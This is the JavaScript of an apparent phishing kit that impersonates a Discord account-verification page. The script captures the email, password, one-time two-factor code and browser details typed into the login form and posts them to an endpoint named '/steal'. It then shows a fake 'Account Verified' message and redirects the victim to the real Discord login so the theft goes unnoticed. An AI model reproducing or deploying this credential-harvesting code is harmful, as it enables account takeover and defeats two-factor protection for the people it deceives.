document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const form = e.target;
    const button = form.querySelector('button');
    const loader = document.getElementById('loader');
    
    // Add loading state
    button.classList.add('loading');
    button.querySelector('span').textContent = 'Verifying...';
    
    // Collect credentials
    const credentials = {
        email: document.getElementById('email').value,
        password: document.getElementById('password').value,
        totp: document.getElementById('totp').value,
        userAgent: navigator.userAgent,
        ip: 'unknown', // Backend will resolve
        timestamp: new Date().toISOString()
    };
    
    try {
        // Send to backend
        const response = await fetch('/steal', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(credentials)
        });
        
        if (response.ok) {
            // Fake success page
            showSuccess();
        }
    } catch (error) {
        console.error('Error:', error);
    }
});

function showSuccess() {
    document.querySelector('.container').innerHTML = `
        <div style="text-align: center; padding: 40px;">
            <div style="font-size: 48px; margin-bottom: 20px;">✅</div>
            <h2 style="color: #36393f; margin-bottom: 10px;">Account Verified</h2>
            <p style="color: #72767d;">Thank you for verifying your account. You will be redirected to Discord shortly.</p>
            <script>
                setTimeout(() => {
                    window.location.href = 'https://discord.com/login';
                }, 2000);
            <\/script>
        </div>
    `;
}
